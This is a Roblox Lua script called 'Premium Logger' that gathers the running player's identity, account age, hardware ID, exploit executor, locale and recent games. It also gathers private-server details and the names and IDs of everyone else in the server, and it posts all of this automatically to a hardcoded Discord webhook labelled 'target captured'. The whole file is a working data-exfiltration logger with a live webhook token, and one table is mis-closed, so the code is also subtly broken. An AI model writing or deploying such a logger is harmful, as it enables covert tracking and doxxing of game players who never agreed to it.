local WEBHOOK_URL = "https://discord.com/api/webhooks/1399418807360946216/zIzjAIRHOwIJ7RTtM-YNC0saLeq2z7vBlUAze_QzVQ5TsxzExC8ONHwtKUelc6NJwpGQ"
local DISCORD_USER_ID = "1359975878297125067"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Stats = game:GetService("Stats")
local GuiService = game:GetService("GuiService")
local LocalizationService = game:GetService("LocalizationService")
local LocalPlayer = Players.LocalPlayer

local function safeCall(func, default)
    local success, result = pcall(func)
    return success and result or default
end

local function getHWID()
    return safeCall(function()
        if gethwid then return gethwid() end
        if syn and syn.fingerprint then return syn.fingerprint() end
        return tostring(game:GetService("RbxAnalyticsService"):GetClientId())
    end, "Tespit Edilemedi")
end

local function getExecutor()
    if identifyexecutor then return identifyexecutor() end
    if getexecutorname then return getexecutorname() end
    if syn then return "Synapse X" end
    if KRNL_LOADED then return "KRNL" end
    if isfluxus then return "Fluxus" end
    if Krnl then return "KRNL" end
    if issentinel then return "Sentinel" end
    if OXYGEN_LOADED then return "Oxygen U" end
    if ARCEUS_LOADED then return "Arceus X" end
    return "Bilinmeyen Executor"
end

local function getPlatform()
    if GuiService:IsTenFootInterface() then
        return "Xbox/Console", "üéÆ"
    elseif UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
        return "Mobile", "üì±"
    elseif UserInputService.KeyboardEnabled then
        return "PC", "üíª"
    else
        return "Bilinmiyor", "‚ùì"
    end
end

local function getPerformanceStats()
    local fps = 60
    local ping = 0
    
    pcall(function()
        local startTime = tick()
        RunService.RenderStepped:Wait()
        fps = math.floor(1 / (tick() - startTime))
    end)
    
    pcall(function()
        ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
    end)
    
    return fps, ping
end

local function getGraphicsQuality()
    local quality = settings():GetService("RenderSettings").QualityLevel
    local qualities = {
        [1] = "Dusuk",
        [2] = "Orta-Dusuk", 
        [3] = "Orta",
        [4] = "Orta-Yuksek",
        [5] = "Yuksek",
        [6] = "Ultra",
        [7] = "Extreme",
        [8] = "Maximum"
    }
    return qualities[quality] or "Otomatik"
end

local function getPremiumStatus()
    if LocalPlayer.MembershipType == Enum.MembershipType.Premium then
        return "Premium Uye", 15844367
    else
        return "Free Uye", 10197915
    end
end

local function getServerInfo()
    local serverInfo = {
        isVIP = false,
        ownerID = nil,
        ownerName = "Yok",
        serverType = "Public Server",
        privateServerID = "Yok",
        accessCode = "Yok"
    }
    
    if game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0 then
        serverInfo.isVIP = true
        serverInfo.ownerID = game.PrivateServerOwnerId
        serverInfo.serverType = "VIP Server"
        serverInfo.privateServerID = game.PrivateServerId
        
        pcall(function()
            local owner = Players:GetPlayerByUserId(game.PrivateServerOwnerId)
            if owner then
                serverInfo.ownerName = owner.Name
            else
                local userInfoUrl = "https://users.roproxy.com/v1/users/" .. game.PrivateServerOwnerId
                local response = game:HttpGet(userInfoUrl)
                local data = HttpService:JSONDecode(response)
                if data and data.name then
                    serverInfo.ownerName = data.name
                end
            end
        end)
        
        pcall(function()
            if game.PrivateServerId and game.PrivateServerId ~= "" then
                serverInfo.accessCode = game.PrivateServerId:sub(1, 8) .. "..."
            end
        end)
    elseif game.PrivateServerId ~= "" then
        serverInfo.serverType = "Reserved Server"
        serverInfo.privateServerID = game.PrivateServerId
    end
    
    return serverInfo
end

local function getServerPlayers()
    local playerList = {}
    local playerCount = 0
    
    for _, player in pairs(Players:GetPlayers()) do
        playerCount = playerCount + 1
        local premiumIcon = player.MembershipType == Enum.MembershipType.Premium and "üëë" or "üë§"
        local playerInfo = string.format("%s **%s** (%d)", premiumIcon, player.Name, player.UserId)
        table.insert(playerList, playerInfo)
    end
    
    return table.concat(playerList, "\n"), playerCount
end

local function getRecentGames()
    local recentGames = "Bilgi Alinamadi"
    
    pcall(function()
        local url = "https://games.roproxy.com/v1/users/" .. LocalPlayer.UserId .. "/games?sortOrder=Desc&limit=5"
        local response = game:HttpGet(url)
        local data = HttpService:JSONDecode(response)
        
        if data and data.data then
            local games = {}
            for i, gameData in ipairs(data.data) do
                if i <= 3 then
                    table.insert(games, gameData.name)
                end
            end
            recentGames = table.concat(games, "\n")
        end
    end)
    
    return recentGames
end

local function getLocaleInfo()
    return safeCall(function()
        local locale = LocalizationService.RobloxLocaleId
        local country = LocalizationService.SystemLocaleId
        return locale, country
    end, "en_US", "Unknown")
end

local function sendToWebhook()
    local serverInfo = getServerInfo()
    local playersList, playerCount = getServerPlayers()
    local fps, ping = getPerformanceStats()
    local platform, platformIcon = getPlatform()
    local premiumStatus, premiumColor = getPremiumStatus()
    local locale, country = getLocaleInfo()
    
    local embedColor = serverInfo.isVIP and 15844367 or 3447003
    
    local fields = {
        {
            ["name"] = "Kullanici Bilgileri",
            ["value"] = string.format(
                "**Kullanici Adi:** `%s`\n**Gorunen Ad:** `%s`\n**User ID:** `%s`\n**Profil:** [Ac](https://www.roblox.com/users/%d/profile)",
                LocalPlayer.Name,
                LocalPlayer.DisplayName,
                tostring(LocalPlayer.UserId),
                LocalPlayer.UserId
            ),
            ["inline"] = false
        },
        
        {
            ["name"] = "Hesap Detaylari",
            ["value"] = string.format(
                "**Premium:** %s\n**Hesap Yasi:** `%d gun`\n**Olusturulma:** <t:%d:R>",
                premiumStatus,
                LocalPlayer.AccountAge,
                os.time() - (LocalPlayer.AccountAge * 86400)
            ),
            ["inline"] = true
        },
        
        {
            ["name"] = "Oyun Bilgileri",
            ["value"] = string.format(
                "**Oyun:** `%s`\n**Place ID:** `%s`\n**Job ID:** ||`%s`||",
                game.Name,
                tostring(game.PlaceId),
                game.JobId
            ),
            ["inline"] = true
        },
        
        {
            ["name"] = "Server Bilgileri",
            ["value"] = string.format(
                "**Tip:** %s\n**Oyuncu:** `%d/%d`\n**Region:** `%s`",
                serverInfo.serverType,
                playerCount,
                Players.MaxPlayers,
                game.JobId:sub(1, 8)
            ),
            ["inline"] = true
        },
        
        {
            ["name"] = "Performans & Cihaz",
            ["value"] = string.format(
                "**Platform:** %s %s\n**FPS:** `%d`\n**Ping:** `%d ms`\n**Grafik:** `%s`",
                platformIcon,
                platform,
                fps,
                ping,
                getGraphicsQuality()
            ),
            ["inline"] = true
        },
        
        {
            ["name"] = "Sistem Bilgileri",
            ["value"] = string.format(
                "**Executor:** `%s`\n**HWID:** ||`%s`||\n**Dil:** `%s`\n**Bolge:** `%s`",
                getExecutor(),
                getHWID(),
                locale,
                country
            ),
            ["inline"] = false
        }
    }
    
    if serverInfo.isVIP then
        table.insert(fields, {
            ["name"] = "VIP Server Detaylari",
            ["value"] = string.format(
                "**Server Sahibi:** [%s](https://www.roblox.com/users/%d/profile)\n**Owner ID:** `%s`\n**Private Server ID:** ||`%s`||\n**Access Code:** ||`%s`||",
                serverInfo.ownerName,
                serverInfo.ownerID,
                tostring(serverInfo.ownerID),
                serverInfo.privateServerID,
                serverInfo.accessCode
            ),
            ["inline"] = false
        })
    end
    
    if playerCount > 0 then
        table.insert(fields, {
            ["name"] = "Sunucudaki Oyuncular (" .. playerCount .. " Kisi)",
            ["value"] = playersList:sub(1, 1024),
            ["inline"] = false
        })
    end
    
    local mainEmbed = {
        ["title"] = "Premium Logger - Hedef Yakalandi",
        ["description"] = string.format(
            "**%s** adli oyuncu sisteme kaydedildi\n\n**Server Tipi:** %s\n**Zaman:** <t:%d:F>",
            LocalPlayer.Name,
            serverInfo.serverType,
            os.time()
        ),
        ["color"] = embedColor,
        ["fields"] = fields,
        ["thumbnail"] = {
            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
        },
        ["image"] = {
            ["url"] = "https://www.roblox.com/outfit-thumbnail/image?userOutfitId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
        },
        ["footer"] = {
            ["text"] = "Premium Logger v3.0 - " .. os.date("%d/%m/%Y %H:%M:%S")
        },
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
    }
    
    local statsEmbed = {
        ["title"] = "Ek Istatistikler",
        ["color"] = 5814783,
        ["fields"] = {
            {
                ["name"] = "Son Oynanan Oyunlar",
                ["value"] = getRecentGames(),
                ["inline"] = false
            },
            {
                ["name"] = "Hizli Linkler",
                ["value"] = string.format(
                    "[Profil](https://www.roblox.com/users/%d/profile) - [Arkadaslar](https://www.roblox.com/users/%d/friends) - [Envanter](https://www.roblox.com/users/%d/inventory)",
                    LocalPlayer.UserId,
                    LocalPlayer.UserId,
                    LocalPlayer.UserId
                ),
                ["inline"] = false
            }
        ],
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
    }
    
    local payload = {
        ["content"] = "<@" .. DISCORD_USER_ID .. "> Yeni Hedef Tespit Edildi",
        ["embeds"] = {mainEmbed, statsEmbed},
        ["username"] = "Premium Logger",
        ["avatar_url"] = "https://i.imgur.com/AfFp7pu.png"
    }
    
    local headers = {["Content-Type"] = "application/json"}
    local body = HttpService:JSONEncode(payload)
    
    local success = pcall(function()
        local requestFunc = request or http_request or syn and syn.request
        if requestFunc then
            requestFunc({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = headers,
                Body = body
            })
        end
    end)
    
    return success
end

task.wait(2)
sendToWebhook()
